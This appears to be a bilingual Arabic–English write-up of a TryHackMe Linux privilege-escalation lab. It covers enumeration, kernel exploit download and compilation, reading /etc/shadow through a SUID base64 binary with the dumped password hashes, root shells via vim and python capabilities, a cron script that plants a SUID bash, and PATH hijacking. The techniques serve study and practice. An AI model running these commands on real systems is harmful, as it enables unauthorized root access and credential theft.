# Linux Privilege Escalation

![image](https://github.com/user-attachments/assets/7d5663ba-af28-421d-823d-67a0c93c8b7f)

<details>
  <summary>Enumeration</summary>


```
Username: karen

Password: Password1
```

  

## 1. Basic Info (معلومات عامة عن النظام)

| أمر        | وظيفته                                                    |
| ---------- | --------------------------------------------------------- |
| `whoami`   | يعرفك اسم المستخدم اللي انت عليه حاليًا                   |
| `id`       | يوضح الـ UID/GID والصلاحيات المرتبطة بيك                  |
| `hostname` | اسم الجهاز – أحيانًا مفيد لو الجهاز له اسم يدل على وظيفته |
| `uname -a` | إصدار الكرنل + المعمارية (x86\_64 أو غيره)                |

![image](https://github.com/user-attachments/assets/6363ac11-bf41-4ae1-9b7d-b9c42e67e1fc)


---

## 2. OS Version & Kernel

| أمر                   | وظيفته                                                                        |
| --------------------- | ----------------------------------------------------------------------------- |
| `cat /etc/issue`      | يطبع اسم وتفاصيل الـ Linux distro (مثلاً Ubuntu 20.04)                        |
| `cat /etc/os-release` | ملف رسمي فيه اسم النسخة + ID + Version                                        |
| `cat /proc/version`   | معلومات عن الكرنل + إذا كان GCC موجود (مهم لو عايز تـ compile local exploits) |



---

## 3. Environment

| أمر          | وظيفته                                                                                            |
| ------------ | ------------------------------------------------------------------------------------------------- |
| `env`        | يطبع كل المتغيرات البيئية، ممكن تلاقي فيها tokens أو مسارات غريبة                                 |
| `echo $PATH` | بيعرفك المسارات اللي النظام بيشوف فيها الملفات القابلة للتنفيذ – مهم جدًا لو فيه مسار قابل للحقن! |


![image](https://github.com/user-attachments/assets/aab5ff77-0ab8-4a6a-b7c5-db330f0e8a2f)

---

## 4. Users and Groups

| أمر               | وظيفته                                                                 |
| ----------------- | ---------------------------------------------------------------------- |
| `cat /etc/passwd` | يطبع كل المستخدمين الموجودين على النظام                                |
| `cat /etc/group`  | يشوف المجموعات اللي موجودة واللي ممكن تكون حساسة (مثلاً: docker، sudo) |

![image](https://github.com/user-attachments/assets/7b0e7204-dc60-4b97-981c-040c90fd6ccf)

![image](https://github.com/user-attachments/assets/ed5096cb-2831-45c1-a506-52bf1271e7f2)


---


## 5. Crontab / Scheduled Jobs

| أمر                 | وظيفته                                                                    |
| ------------------- | ------------------------------------------------------------------------- |
| `crontab -l`        | المهام المجدولة للمستخدم الحالي                                           |
| `ls -la /etc/cron*` | يشوف كل ملفات الـ crontab في النظام – أحيانًا تلاقي سكريبت بيتنفذ بـ root |
| `cat /etc/crontab`  | المهام المجدولة للنظام ككل – ممكن تديك وسيلة للاستغلال                    |



---

## 6. Processes & Services

| أمر                             | وظيفته                                                                   |
| ------------------------------- | ------------------------------------------------------------------------ |
| `ps aux`                        | يعرض كل العمليات الجارية – ممكن تلاقي برنامج بيشغله root                 |
| `top` أو `htop`                 | مشاهدة تفاعلية للعمليات                                                  |
| `netstat -tulnp` أو `ss -tulnp` | الخدمات اللي شغالة على البورتات – ممكن تلاقي حاجة داخليًا بس (localhost) |


![image](https://github.com/user-attachments/assets/16f4a91d-8133-481a-b79a-eb75ecbcb0f5)


![image](https://github.com/user-attachments/assets/e919e12d-1c12-405b-81cc-2d4a55b83133)
![image](https://github.com/user-attachments/assets/ec996032-2bf8-411f-8b80-590ed7b4e971)

![image](https://github.com/user-attachments/assets/03193a5c-21cf-4abe-b00a-616bb3e026f8)

![image](https://github.com/user-attachments/assets/a8f6abd4-62c9-4fe1-a78d-942b6929c021)

---

## 7. File System Permissions

| أمر                                     | وظيفته                                                                   |
| --------------------------------------- | ------------------------------------------------------------------------ |
| `find / -perm -4000 2>/dev/null`        | يبحث عن ملفات SUID – ملفات بتشتغل بصلاحيات المالك، ممكن تديك root access |
| `find / -perm -u=s -type f 2>/dev/null` | بديل للبحث عن SUID executables                                           |
| `find / -writable -type d 2>/dev/null`  | مجلدات قابلة للكتابة – ممكن تعمل فيها استغلال                            |


![image](https://github.com/user-attachments/assets/5c13b75e-a6c9-4e51-aa7d-0702d534d47c)

![image](https://github.com/user-attachments/assets/fde332e2-f181-44c0-b326-8f0c9150e57a)

![image](https://github.com/user-attachments/assets/4a89aa31-9be3-4e87-85df-0d1ec5ad4710)



---







## ✅ ملخص سريع :

| المحور           | الهدف                                         |
| ---------------- | --------------------------------------------- |
| OS & Kernel Info | تشوف لو في ثغرات على النسخة دي                |
| Environment      | PATH وقيم مهمة ممكن تسبب استغلال              |
| Users & Groups   | هل انت في مجموعة حساسة؟                       |
| Cron Jobs        | هل في سكريبت بيشتغل بوقت محدد ممكن تعدله؟     |
| Processes        | هل في برامج بتشتغل بصلاحيات أعلى؟             |
| SUID Files       | ممكن تستغل ملف بـ SUID عشان تاخد صلاحيات أعلى |






---
---





![image](https://github.com/user-attachments/assets/b8d06c67-4553-4990-ad30-9034da8eaf34)






  
</details>


















<details>
  <summary>Automated Enumeration Tools</summary>

# 🔐 Linux Privilege Escalation Enumeration Tools

قائمة بأهم الأدوات المفتوحة المصدر التي تُستخدم لتجميع معلومات النظام (Enumeration) من أجل اكتشاف فرص للترقية إلى صلاحيات أعلى (Root).

---

## 🥇 1. [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- 🔎 من أقوى الأدوات الآلية لتجميع كل شيء تقريبًا.
- تبحث عن:
  - صلاحيات خاطئة في الملفات
  - SUID/SGID binaries
  - ملفات cron
  - كلمات مرور مكشوفة
  - خدمات مشغلة بصلاحيات عالية
- 🧠 تحتوي على خوارزميات للكشف عن misconfigurations والفرص الواضحة للاستغلال.
- ✅ مناسبة للأنظمة الحديثة والمتنوعة.

---

## 🥈 2. [LinEnum](https://github.com/rebootuser/LinEnum)

- 📜 سكربت Bash تقليدي لكن شامل.
- يقوم بجمع معلومات مثل:
  - بيانات النظام والمستخدم
  - cron jobs
  - network config
  - ملفات SUID/SGID
- 💡 أقل تفاعلية من LinPEAS، لكنه خفيف وسهل التشغيل.
- مفيد في حالات محدودة الموارد.

---

## 🥉 3. [LES - Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

- 🔍 يحلل إصدار الكرنل ويقترح عليك Exploits معروفة.
- مش بيعمل Enumeration كامل، لكنه:
  - يقارن الكرنل الحالي بقاعدة بيانات فيها Exploits قديمة
  - يعطيك توصيات مباشرة
- مناسب بعد معرفة إصدار الكرنل من `uname -a`.

---

## 4. [Linux Smart Enumeration (LSE)](https://github.com/diego-treitos/linux-smart-enumeration)

- 🧠 أداة ذكية تعمل بـ 3 أوضاع:
  - Quick
  - Standard
  - Thorough
- تعرض النتائج بتنسيق واضح وسهل الفهم.
- مصممة لتكون "هادئة" – لا تترك أثر واضح في النظام.
- مفيدة للاختبارات الهادئة (Low OPSEC).

---

## 5. [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

- 📘 سكربت Python قديم نسبيًا لكنه مفيد.
- يعطيك ملخص لبيئة التشغيل، الصلاحيات، الملفات الغريبة.
- مناسب مع الأنظمة القديمة أو أنظمة Python-only.

---

## 🧰 ملاحظات عامة:

| أداة | نوعها | الأفضل لـ |
|------|--------|------------|
| LinPEAS | شامل + ذكي | اكتشاف فرص متعددة + تحليل شامل |
| LinEnum | بسيط + مباشر | بيئة محدودة أو سكربت سريع |
| LES | اقتراح Exploits فقط | بعد معرفة kernel |
| LSE | ذكي + منظم | الاختبارات الدقيقة بدون ضوضاء |
| LinuxPrivChecker | خفيف + Python | بيئات قديمة أو محدودة |

---

> 💡 **نصيحة:** الأفضل دائمًا تبدأ بـ LinPEAS أو LSE، وبعد كده تستخدم LES لو فيه فرصة لاستغلال الكرنل.


  
</details>

























<details>
  <summary>Privilege Escalation: Kernel Exploits</summary>


# 🚀 Linux Privilege Escalation – Kernel Exploits

## 🎯 الهدف
استغلال ثغرات في نواة النظام (Kernel) للترقية من مستخدم عادي إلى root.

---

## 🧾 1. تحديد إصدار الكرنل

```bash
uname -r
```

مثال إخراج:
```
3.13.0-24-generic
```

---

## 🔍 2. البحث عن ثغرات مناسبة

### أدوات مساعدة:
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Exploit-DB](https://www.exploit-db.com)
- `searchsploit` (لو مثبت عندك)

### مثال باستخدام LES:
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## 🛠️ 3. تجربة Exploit

### خطوات عامة:

1. تحميل الكود:
```bash
wget https://www.exploit-db.com/raw/37292 -O exploit.c
```

2. تجميع (Compile):
```bash
gcc exploit.c -o exploit
```

3. تشغيل:
```bash
./exploit
```

4. التحقق من الصلاحيات:
```bash
whoami
id
```

---

## ⚠️ ملاحظات مهمة

| نقطة | توضيح |
|------|--------|
| ❗ Compiler (مثل gcc) لازم يكون متاح | لو مش موجود، compile من جهازك وانقل الملف |
| ⚙️ بعض الثغرات مش بتشتغل دايمًا | جرب أكثر من exploit |
| 📛 Kernel Exploits خطيرة | ممكن تسبب system crash أو shell غير مستقرة |
| 🧠 استخدم Virtual Machine أو اختبار فقط | لتفادي تلف النظام |

---

## ✅ خطوات التلخيص

| الخطوة | الأداة |
|--------|--------|
| تحديد إصدار الكرنل | `uname -r` |
| اقتراح ثغرات | LES، Exploit-DB، searchsploit |
| تحميل واستغلال | `wget`, `gcc`, `./exploit` |
| التأكد من النجاح | `whoami`, `id` |

---

> 💡 **نصيحة:** دائمًا احتفظ بمجموعة Exploits جاهزة، واختبرها في بيئة آمنة فقط.





---
---

![image](https://github.com/user-attachments/assets/390d0b3e-a279-4b22-bfd2-df265e05b60e)

![image](https://github.com/user-attachments/assets/3945f3af-cdf2-4342-9412-7dc108059dd7)

```
cd /tmp
wget https://www.exploit-db.com/raw/37292 -O exploit.c
```

```
gcc exploit.c -o exploit
./exploit
```

![image](https://github.com/user-attachments/assets/30b5b5b8-31da-4537-b1cc-626f6dc91fca)


```
THM-28392872729920
```


  
</details>











<details>
  <summary>Privilege Escalation: Sudo</summary>



![image](https://github.com/user-attachments/assets/c9d1a10a-e3ae-4ac8-8640-3ca05260682b)


![image](https://github.com/user-attachments/assets/6fd0efaf-d307-409a-b924-24b7c0ac4202)


```
sudo nano /etc/shadow
```

![image](https://github.com/user-attachments/assets/1cba0943-d5e7-4d27-a43c-070ddf5c5eb1)






  
</details>






<details>
  <summary>Privilege Escalation: SUID</summary>


list files that have SUID or SGID 

```
find / -type f -perm -04000 -ls 2>/dev/null
```

```ruby
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
     3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
     6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
     7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
     1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
     1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
     1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
     1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
     1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
     1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
     7477     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    13816    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
    13661     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
     1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
     2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
     1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
     1634     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
     1860     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
     1859     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
     1507     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
     1857     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
     1674     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
     1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
```


```css
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
```

![image](https://github.com/user-attachments/assets/bf1a3ca9-f1c0-48b9-aff8-beefdd03286a)


```
LFILE=/etc/shadow
```

now read the file:


```
/usr/bin/base64 "$LFILE"
```

``output``

```
cm9vdDoqOjE4NTYxOjA6OTk5OTk6Nzo6OgpkYWVtb246KjoxODU2MTowOjk5OTk5Ojc6OjoKYmlu
Oio6MTg1NjE6MDo5OTk5OTo3Ojo6CnN5czoqOjE4NTYxOjA6OTk5OTk6Nzo6OgpzeW5jOio6MTg1
NjE6MDo5OTk5OTo3Ojo6CmdhbWVzOio6MTg1NjE6MDo5OTk5OTo3Ojo6Cm1hbjoqOjE4NTYxOjA6
OTk5OTk6Nzo6OgpscDoqOjE4NTYxOjA6OTk5OTk6Nzo6OgptYWlsOio6MTg1NjE6MDo5OTk5OTo3
Ojo6Cm5ld3M6KjoxODU2MTowOjk5OTk5Ojc6OjoKdXVjcDoqOjE4NTYxOjA6OTk5OTk6Nzo6Ogpw
cm94eToqOjE4NTYxOjA6OTk5OTk6Nzo6Ogp3d3ctZGF0YToqOjE4NTYxOjA6OTk5OTk6Nzo6Ogpi
YWNrdXA6KjoxODU2MTowOjk5OTk5Ojc6OjoKbGlzdDoqOjE4NTYxOjA6OTk5OTk6Nzo6OgppcmM6
KjoxODU2MTowOjk5OTk5Ojc6OjoKZ25hdHM6KjoxODU2MTowOjk5OTk5Ojc6OjoKbm9ib2R5Oio6
MTg1NjE6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4NTYxOjA6OTk5OTk6Nzo6Ogpz
eXN0ZW1kLXJlc29sdmU6KjoxODU2MTowOjk5OTk5Ojc6OjoKc3lzdGVtZC10aW1lc3luYzoqOjE4
NTYxOjA6OTk5OTk6Nzo6OgptZXNzYWdlYnVzOio6MTg1NjE6MDo5OTk5OTo3Ojo6CnN5c2xvZzoq
OjE4NTYxOjA6OTk5OTk6Nzo6OgpfYXB0Oio6MTg1NjE6MDo5OTk5OTo3Ojo6CnRzczoqOjE4NTYx
OjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4NTYxOjA6OTk5OTk6Nzo6Ogp0Y3BkdW1wOio6MTg1NjE6
MDo5OTk5OTo3Ojo6CnNzaGQ6KjoxODU2MTowOjk5OTk5Ojc6OjoKbGFuZHNjYXBlOio6MTg1NjE6
MDo5OTk5OTo3Ojo6CnBvbGxpbmF0ZToqOjE4NTYxOjA6OTk5OTk6Nzo6OgplYzItaW5zdGFuY2Ut
Y29ubmVjdDohOjE4NTYxOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEhOjE4Nzk2Ojo6
Ojo6CnVidW50dTohOjE4Nzk2OjA6OTk5OTk6Nzo6OgpnZXJyeWNvbndheTokNiR2Z3pneE0zeWJU
bEIud2tWJDQ4WURZN3FRbnA0cHVyT0oxOW14Zk1Pd0t0LkgyTGFXS1B1MHpLbFdLYVVNRzFON3dl
Vnpxb2JwNjVSeGxNSVovTmlyeGVaZE9KTUVPcDNvZkUuUlQvOjE4Nzk2OjA6OTk5OTk6Nzo6Ogp1
c2VyMjokNiRtNlZtektUYnpDRC8uSTEwJGNLT3ZaWjgvcnNZd0hkLnBFMDk5WlJ3TTY4NnAvRXAx
M2g3cEZNQkNHNHQ3SXVrUnFjL2ZYbEExZ0hYaDlGMkNid21ENEVwaTFXZ2guQ2wuVlYxbWIvOjE4
Nzk2OjA6OTk5OTk6Nzo6OgpseGQ6IToxODc5Njo6Ojo6OgprYXJlbjokNiRWamNyS3ovNlM4cmhW
NEk3JHlib1RiME1FeHFwTVhXMGhqRUpncUxXcy9qR1BKQTdOL2ZFb1BNdVlMWTF3MTZGd0w3RUND
YlFXSnFZTEdweS5ac2NuYTlHSUxDU2FOTEpkQlAxcDgvOjE4Nzk2OjA6OTk5OTk6Nzo6Ogo=
```

it return ``/etc/shadow`` but encoded 

```
/usr/bin/base64 "$LFILE" | base64 --decode
```

`output`

```
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
```

``user2`` hash

```
$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/
```

![image](https://github.com/user-attachments/assets/20bd2e82-a055-4cb4-ba9c-70dad84c7076)

using same way to read ``flag3.txt``

```
LFILE=/home/ubuntu/flag3.txt
/usr/bin/base64 "$LFILE" | base64 --decode
```

![image](https://github.com/user-attachments/assets/284627cd-cc2d-483b-8f0d-f3c420f4b2a7)

```
THM-3847834
```

  
</details>






<details>
  <summary>Privilege Escalation: Capabilities</summary>


# 🔐 Linux Capabilities & Privilege Escalation

## 🧠 ما هي Linux Capabilities؟

في أنظمة لينكس الحديثة، يمكن منح **صلاحيات جزئية** للبرامج بدون الحاجة لتشغيلها بصلاحيات `root`.  
هذه الصلاحيات تُعرف باسم: **Capabilities**

مثال:
- `cap_net_raw` → يسمح بفتح raw sockets (مفيد لأدوات الشبكة)
- `cap_dac_read_search` → يسمح بقراءة ملفات بدون صلاحية قراءة

---

## 🎯 الهدف في الـ Privilege Escalation

نبحث عن برامج تمتلك Capabilities قوية يمكن استغلالها للوصول إلى صلاحيات `root`.

---

## 🔍 كيف نبحث عن الملفات ذات Capabilities؟

استخدم الأمر التالي من مستخدم عادي:

```bash
getcap -r / 2>/dev/null
```

- `-r /` → يبحث بشكل تكراري في كل النظام
- `2>/dev/null` → يتجاهل رسائل الخطأ

---

## 💡 ملاحظات هامة:

| النوع         | أداة الكشف        |
|--------------|------------------|
| SUID         | `find`           |
| Capabilities | `getcap`         |

> Capabilities لا تظهر في فحص الـ SUID، لذلك تحتاج لفحص خاص.

---

## 🧰 GTFObins — أداة ممتازة للاستغلال

موقع GTFObins يحتوي على قائمة ببرامج يمكن استغلالها:

🔗 [https://gtfobins.github.io](https://gtfobins.github.io)

ابحث عن أي برنامج (مثل `vim`, `perl`, `python`, `tar`) وتحقق إذا كان له استغلال تحت قسم **Capabilities**.

---

## 🧪 مثال عملي: استغلال vim بوجود Capability

### 1. تحقق من وجود capability على vim:

```bash
/usr/bin/vim = cap_setuid+ep
```

### 2. شغّل vim مع أمر تنفيذ داخلي:

```bash
vim -c ':!sh'
```

### 3. تحقق من الصلاحيات:

```bash
id
# uid=0(root) gid=0(root)
```

✅ مبروك! حصلت على shell بصلاحيات root.

---

## ✅ ملخص سريع

| العنصر              | الشرح |
|---------------------|-------|
| Capabilities         | صلاحيات جزئية تُمنح للبرامج بدلاً من root الكامل |
| getcap               | أداة لفحص البرامج ذات Capabilities |
| استغلال capabilities | إذا كان البرنامج يملك capability قوية، يمكن تشغيله والحصول على صلاحيات أعلى |
| GTFObins             | موقع يعرض طرق استغلال البرامج المعروفة |

---

## 🔚 الخطوة التالية

- شغّل:
```bash
getcap -r / 2>/dev/null
```

- ثم راجع النتائج وأرسل البرامج هنا لتحليل فرص التصعيد 🚀






## 🟥 Capabilities خطيرة جدًا:

| Capability            | خطورتها                                         |
| --------------------- | ----------------------------------------------- |
| `cap_setuid`          | تغيير UID (يعني ممكن يشغّل نفسه كـ root) 😈     |
| `cap_sys_admin`       | شبه صلاحيات root، كنز حقيقي 💣                  |
| `cap_dac_override`    | يتجاوز صلاحيات الملفات، ممكن يقرأ/يكتب أي ملف   |
| `cap_dac_read_search` | يقرأ أي ملف حتى لو مالكوش صلاحية عليه           |
| `cap_fowner`          | يقدر يعدل على ملفات مش بتاعته                   |
| `cap_net_raw`         | يستخدم RAW sockets، ممكن sniff أو spoof الشبكة  |
| `cap_sys_ptrace`      | ممكن يعمل Debug على عمليات تانية (وسرقة بيانات) |



## 🟡 Capabilities متوسطة الخطورة:


| Capability             | ملاحظات                                                |
| ---------------------- | ------------------------------------------------------ |
| `cap_net_bind_service` | يفتح بورت أقل من 1024 (ممكن استخدامه لتصعيد داخل خدمة) |
| `cap_chown`            | يغير مالك الملفات — مفيد في بعض السيناريوهات           |
| `cap_kill`             | يقتل أي عملية — ممكن يستخدم لإيقاف الحماية أو الخدمات  |


## 🧪 مثال عملي:

```
/usr/bin/python3.8 = cap_setuid+ep
```

ده معناه إن ``python3.8`` يقدر يغير الـ UID ويشتغل كـ root
لو شغلته كده:

```
python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

لو نجحت، هيجيلك شيل بصلاحيات root مباشرة 💥


## 🧠 مصادر تعرفك خطورة أي capability:
🔗 [man 7 capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)

🔍 موقع GTFObins: ابحث عن اسم البرنامج وشوف لو له استغلال تحت Capabilities

🔐 أداة linpeas.sh ``→`` تعرضلك البرامج ``+`` capabilities ``+`` تقييم خطورتها




---
----


```
getcap -r / 2>/dev/null
```

![image](https://github.com/user-attachments/assets/8bcf831c-bd12-43da-be58-2f215effb02b)

```
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","sh","-c","reset; exec sh")'
```

| الجزء              | المعنى                                      |
| ------------------ | ------------------------------------------- |
| `vim -c`           | شغّل vim ونفّذ أمر مباشرة                   |
| `:py3 ...`         | نفّذ كود بايثون 3 داخل vim                  |
| `import os`        | استورد مكتبة التعامل مع النظام              |
| `os.setuid(0)`     | غير الـ UID للمستخدم رقم 0 (يعني `root`) 🔥 |
| `os.execl(...)`    | شغّل شيل جديد (`/bin/bash`) كأنك root       |
| `"reset; exec sh"` | يعمل reset للشاشة ويفتح sh shell            |




![image](https://github.com/user-attachments/assets/65526dad-54e1-4e20-95c2-8b06fd91067d)

```
THM-9349843
```
  
</details>









<details>
  <summary>Privilege Escalation: Cron Jobs</summary>


```
cat /etc/crontab
```

![image](https://github.com/user-attachments/assets/b9c23b11-4516-4fd0-ad54-8c77db861036)


```
nano backup.sh
```

```
#!/bin/bash
cp /bin/bash /tmp/rootsh
chmod +s /tmp/rootsh
```

```
chmod +x backup.sh
```

```
/tmp/rootsh -p
```

![image](https://github.com/user-attachments/assets/003a55fc-b84a-4eb2-8118-0ca7253af35f)

![image](https://github.com/user-attachments/assets/514ce262-1ca7-454e-a106-c926d5843323)


```
THM-383000283
```


![image](https://github.com/user-attachments/assets/8611b0c9-fc32-46ed-9e5e-71b6c0794298)


```
john cron_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://github.com/user-attachments/assets/609fc90b-4ab4-4ef6-aae5-25a115d14ba3)


  
</details>








<details>
  <summary>Privilege Escalation: PATH</summary>

# 🛡️ Privilege Escalation via `$PATH` Hijacking

## 📌 ما هو `$PATH`؟

`$PATH` هو متغير بيئي (Environment Variable) يحتوي على قائمة من المسارات (directories)، اللي النظام بيدور فيها على الأوامر اللي بتكتبها في الطرفية (Terminal).

### ✅ مثال:

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

لما تكتب:

```bash
$ thm
```

النظام بيدور على ملف تنفيذي اسمه `thm` في المسارات دي بالترتيب.

---

## 🎯 كيف نستغل `$PATH` لتصعيد الصلاحيات؟

لو فيه سكربت أو برنامج بيشتغل بصلاحيات `root` (مثلاً عليه SUID)، وبيستدعي أمر داخله زي `thm` بدون المسار الكامل:

```bash
thm
```

ممكن نستغل ده عن طريق إنشاء ملف بنفس اسم الأمر `thm` ونحطه في مجلد قابل للكتابة، ونضيف المجلد ده في بداية `$PATH`. لما السكربت يشتغل، هيشغل نسختنا إحنا بدل الأمر الحقيقي!

---

## ⚙️ خطوات الاستغلال العملي

### 🧪 السيناريو:

نفترض وجود برنامج باسم `path` فيه الكود التالي:

```bash
#!/bin/bash
thm
```

وتم إعطاءه صلاحية SUID:

```bash
$ chmod u+s path
```

### 🔍 الخطوة 1: معرفة المجلدات القابلة للكتابة

نفذ الأمر التالي:

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

هتلاحظ أن `/tmp` عادةً بيكون قابل للكتابة.

### 🔧 الخطوة 2: تعديل `$PATH`

```bash
export PATH=/tmp:$PATH
```

### 🧨 الخطوة 3: إنشاء نسخة مزيفة من `thm`

```bash
cp /bin/bash /tmp/thm
chmod +x /tmp/thm
```

### 🚀 الخطوة 4: تشغيل برنامج `path`

```bash
./path
```

### ✅ الآن داخل الشيل:

```bash
id
whoami
```

هيظهر:

```
uid=0(root) gid=0(root)
```

---

## 💡 ملاحظات هامة:

* لا تنجح هذه الطريقة إلا إذا كان السكربت لا يحدد المسار الكامل للأمر.
* يجب أن يكون السكربت عليه SUID أو يعمل بصلاحيات `root`.
